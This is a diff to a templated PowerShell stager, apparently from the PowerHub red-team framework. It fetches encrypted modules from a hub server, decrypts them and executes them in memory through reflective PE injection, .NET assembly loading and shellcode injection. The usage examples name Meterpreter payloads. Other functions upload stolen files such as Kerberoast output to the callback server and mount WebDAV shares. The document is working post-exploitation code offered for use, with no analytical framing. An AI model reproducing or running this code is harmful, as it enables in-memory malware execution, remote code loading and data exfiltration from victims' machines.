@@ -1,4 +1,4 @@
-Write-Host @"
+Write-Output @"
   _____   _____  _  _  _ _______  ______ _     _ _     _ ______
  |_____] |     | |  |  | |______ |_____/ |_____| |     | |_____]
  |       |_____| |__|__| |______ |    \_ |     | |_____| |_____]
@@ -13,6 +13,7 @@ Set-Alias -Name Decrypt-Code -Value {{symbol_name("Decrypt-Code")}}
 $WEBDAV_URL = "{{webdav_url}}"
 $ErrorActionPreference = "Stop"
 $PS_VERSION = $PSVersionTable.PSVersion.Major
+{{'$DebugPreference = "Continue"'|debug}}
 
 $Modules = @()
 {% if modules %}
@@ -62,9 +63,9 @@ function Import-HubModule {
     }
 
     if ($?){
-        Write-Host ("[*] {0} imported." -f $Module["name"])
+        Write-Verbose ("[*] {0} imported." -f $Module["name"])
     } else {
-        Write-Host ("[*] Failed to import {0}" -f $Module["name"])
+        Write-Error ("[*] Failed to import {0}" -f $Module["name"])
     }
 }
 
@@ -170,6 +171,7 @@ Use the '-Verbose' option to print detailed information.
     $K=new-object net.webclient;
     $K.proxy=[Net.WebRequest]::GetSystemWebProxy();
     $K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
+    $result = @()
     foreach ($i in $indices) {
         if ($i -lt $Modules.length -and $i -ge 0) {
             $compression = "&c=1"
@@ -178,7 +180,9 @@ Use the '-Verbose' option to print detailed information.
             $Modules[$i]["code"] = $K.downloadstring($url);
             Import-HubModule $Modules[$i]
         }
+        $result += $Modules[$i]
     }
+    $result
 }
 
 
@@ -195,25 +199,84 @@ Run-Exe 47
 Description
 -----------
 Execute the exe module 47 in memory
+
+.EXAMPLE
+
+Load-HubModule meterpreter.exe | Run-Exe
+
+Description
+-----------
+
+Load the exe module with the name 'meterpreter.exe' in memory and run it
 #>
     Param(
-        [parameter(Mandatory=$true)]
-        [Int]
-        $n
+        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)] $Module
     )
 
     if (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue)
     {
-        $code = $Modules[$n]["code"]
-        $code = [System.Convert]::FromBase64String($code)
-        $code = Decrypt-Code $code $KEY
-        $code = Unzip-Code $code
-        Invoke-ReflectivePEInjection -PEBytes $code -ForceASLR
+        foreach ($n in $Module) {
+            if ($n.gettype() -eq [Int32]) {
+                $code = $Modules[$n]["code"]
+            } else {
+                $code = $n["code"]
+            }
+            $code = [System.Convert]::FromBase64String($code)
+            $code = Decrypt-Code $code $KEY
+            $code = Unzip-Code $code
+            Invoke-ReflectivePEInjection -PEBytes $code -ForceASLR
+        }
     } else {
-        Write-Host "[-] PowerSploit's Invoke-ReflectivePEInjection not available. You need to load it first."
+        Write-Error "[-] PowerSploit's Invoke-ReflectivePEInjection not available. You need to load it first."
     }
 }
 
+function Save-HubModule {
+<#
+.SYNOPSIS
+
+Saves a loaded module to disk. WARNING: This will most likely trigger endpoint protection!
+
+.EXAMPLE
+
+Save-HubModule 41 -Directory tmp/
+
+Description
+-----------
+Save module 41 to directory tmp/
+
+.EXAMPLE
+
+Load-HubModule meterpreter.exe | Save-HubModule
+
+Description
+-----------
+
+Load the exe module with the name 'meterpreter.exe' in memory and save it to disk
+#>
+    Param(
+        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)] $Module,
+        [parameter(Mandatory=$false,Position=1)] $Directory = ""
+    )
+
+    foreach ($n in $Module) {
+        if ($n.gettype() -eq [Int32]) {
+            $m = $Modules[$n]
+        } else {
+            $m = $n
+        }
+        $code = $m["code"]
+        $code = [System.Convert]::FromBase64String($code)
+        $code = Decrypt-Code $code $KEY
+        $code = Unzip-Code $code
+        if ($Directory) {
+            $Filename = "$Directory/$($m['shortname'])"
+        } else {
+            $Filename = $m["shortname"]
+        }
+        $code | Set-Content "$Filename" -Encoding Byte
+    }
+}
 
 function Run-DotNETExe {
 <#
@@ -229,26 +292,37 @@ Run-DotNETExe 47 "system"
 Description
 -----------
 Load and execute the .NET binary 47 in memory with the parameter "system"
+
+.EXAMPLE
+
+Load-HubModule meterpreter.exe | Run-DotNETExe
+
+Description
+-----------
+
+Load the .NET module with the name 'meterpreter.exe' in memory and run it
 #>
 
     Param(
-        [parameter(Mandatory=$true)]
-        [Int]
-        $n,
-
-        [parameter(Mandatory=$false)]
-        [string[]] $Arguments
-
+        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)] $Module,
+        [parameter(Mandatory=$false)] [string[]] $Arguments
     )
 
-    $code = $Modules[$n]["code"]
-    $code = [System.Convert]::FromBase64String($code)
-    $code = Decrypt-Code $code $KEY
-    $code = Unzip-Code $code
-    $a = [Reflection.Assembly]::Load([byte[]]$code)
-    $al = New-Object -TypeName System.Collections.ArrayList
-    $al.add($Arguments)
-    $a.EntryPoint.Invoke($Null, $al.ToArray());
+    foreach ($n in $Module) {
+        if ($n.gettype() -eq [Int32]) {
+            $m = $Modules[$n]
+        } else {
+            $m = $n
+        }
+        $code = $m["code"]
+        $code = [System.Convert]::FromBase64String($code)
+        $code = Decrypt-Code $code $KEY
+        $code = Unzip-Code $code
+        $a = [Reflection.Assembly]::Load([byte[]]$code)
+        $al = New-Object -TypeName System.Collections.ArrayList
+        $al.add($Arguments)
+        $a.EntryPoint.Invoke($Null, $al.ToArray());
+    }
 }
 
 
@@ -265,30 +339,41 @@ Run-Shellcode 47
 Description
 -----------
 Execute the shellcode module 47 in memory
+
+.EXAMPLE
+
+Load-HubModule meterpreter.bin | Run-Shellcode
+
+Description
+-----------
+
+Load the shellcode module with the name 'meterpreter.bin' in memory and run it
 #>
     Param(
-        [parameter(Mandatory=$true)]
-        [Int]
-        $n,
-
-        [ValidateNotNullOrEmpty()]
-        [UInt16]
-        $ProcessID
+        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)] $Module,
+        [ValidateNotNullOrEmpty()] [UInt16] $ProcessID
     )
 
     if (Get-Command "Invoke-Shellcode" -errorAction SilentlyContinue)
     {
-        $code = $Modules[$n]["code"]
-        $code = [System.Convert]::FromBase64String($code)
-        $code = Decrypt-Code $code $KEY
-        $code = Unzip-Code $code
-        if ($ProcessID) {
-            Invoke-Shellcode -Shellcode $code -ProcessID $ProcessID
-        } else {
-            Invoke-Shellcode -Shellcode $code
+        foreach ($n in $Module) {
+            if ($n.gettype() -eq [Int32]) {
+                $m = $Modules[$n]
+            } else {
+                $m = $n
+            }
+            $code = $m["code"]
+            $code = [System.Convert]::FromBase64String($code)
+            $code = Decrypt-Code $code $KEY
+            $code = Unzip-Code $code
+            if ($ProcessID) {
+                Invoke-Shellcode -Shellcode $code -ProcessID $ProcessID
+            } else {
+                Invoke-Shellcode -Shellcode $code
+            }
         }
     } else {
-        Write-Host "[-] PowerSploit's Invoke-Shellcode not available. You need to load it first."
+        Write-Error "[-] PowerSploit's Invoke-Shellcode not available. You need to load it first."
     }
 }
 
@@ -324,7 +409,20 @@ function Send-File {
         "--$boundary--$LF"
     ) -join $LF
 
-    $response = Invoke-RestMethod -Uri $($CALLBACK_URL + "u?noredirect=1") -Method "POST" -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
+    $post_url = $($CALLBACK_URL + "u?noredirect=1")
+    {{'Write-Debug "POSTing the file to $post_url..."'|debug}}
+    $WebRequest = [System.Net.WebRequest]::Create($post_url)
+    $WebRequest.Method = "POST"
+    $WebRequest.ContentType = "multipart/form-data; boundary=`"$boundary`""
+    $WebRequest.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
+    $PostStream = $WebRequest.GetRequestStream()
+    $BodyLines = [System.Text.Encoding]::ASCII.GetBytes($BodyLines)
+    $PostStream.Write($BodyLines, 0, $BodyLines.Length)
+    $PostStream.Close()
+    {{'Write-Debug "Reading response"'|debug}}
+    try {
+        $Response = $WebRequest.GetResponse()
+    } catch {}
 }
 
 
@@ -338,13 +436,14 @@ Uploads files back to the hub via Cmdlet.
 
 PushTo-Hub kerberoast.txt, users.txt
 
+Description
+-----------
+Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
+
 .EXAMPLE
 
 Get-ChildItem | PushTo-Hub -Name "directory-listing"
 
-Description
------------
-Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
 #>
     Param(
        [Parameter(Mandatory=$False)]
@@ -357,12 +456,15 @@ Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
        $Stream
     )
 
-    begin { $result = @() }
+    begin {
+        $result = @()
+    }
     process {
         $result = $result + $Stream
     }
     end {
         if ($result) {
+            {{'Write-Debug "Pushing stdin stream..."'|debug}}
             if ($result.length -eq 1 -and $result[0] -is [System.String]) {
                 Send-File $result[0] $Name
             } else {
@@ -371,6 +473,7 @@ Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
             }
         } else {
             ForEach ($file in $Files) {
+                {{'Write-Debug "Pushing $File..."'|debug}}
                 $abspath = (Resolve-Path $file).path
                 $fileBin = [System.IO.File]::ReadAllBytes($abspath)
                 $enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
@@ -386,6 +489,7 @@ Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
 }
 
 $global:WebdavLetter = $Null
+$global:WebdavRoLetter = $Null
 
 function Mount-Webdav {
 <#
@@ -393,17 +497,27 @@ function Mount-Webdav {
 
 Mount the Webdav drive.
 
+.PARAMETER RoLetter
+
+The letter the mounted read-only drive will receive (default: 'R')
+
 .PARAMETER Letter
 
-The letter the mounted drive will receive (default: 'S')
+The letter the mounted public drive will receive (default: 'S')
 
 #>
     Param(
         [parameter(Mandatory=$False)]
-        [String]$Letter = "S"
+        [String]$Letter = "S",
+        [parameter(Mandatory=$False)]
+        [String]$RoLetter = "R"
     )
     Set-Variable -Name "WebdavLetter" -Value "$Letter" -Scope Global
-    $netout = & net use ${Letter}: \\$WEBDAV_URL /persistent:no 2>&1 | Out-Null
+    Set-Variable -Name "WebdavRoLetter" -Value "$RoLetter" -Scope Global
+    {{'Write-Debug "Mounting $WEBDAV_URL to $LETTER"'|debug}}
+    $netout = iex "net use ${Letter}: $WEBDAV_URL /persistent:no 2>&1" | Out-Null
+    {{'Write-Debug "Mounting ${WEBDAV_URL}_ro to $RoLETTER"'|debug}}
+    $netout = iex "net use ${RoLetter}: ${WEBDAV_URL}_ro /persistent:no 2>&1" | Out-Null
     if (!$?) {
         throw "Error while executing 'net use': $netout"
     }
@@ -418,7 +532,8 @@ Unmount the Webdav drive.
 
 #>
     If (${WebdavLetter}) {
-        $netout = & net use ${WebdavLetter}: /delete 2>&1 | Out-Null
+        $netout = iex "net use ${WebdavLetter}: /delete 2>&1" | Out-Null
+        $netout = iex "net use ${WebdavRoLetter}: /delete 2>&1" | Out-Null
         if (!$?) {
             throw "Error while executing 'net use': $netout"
         }
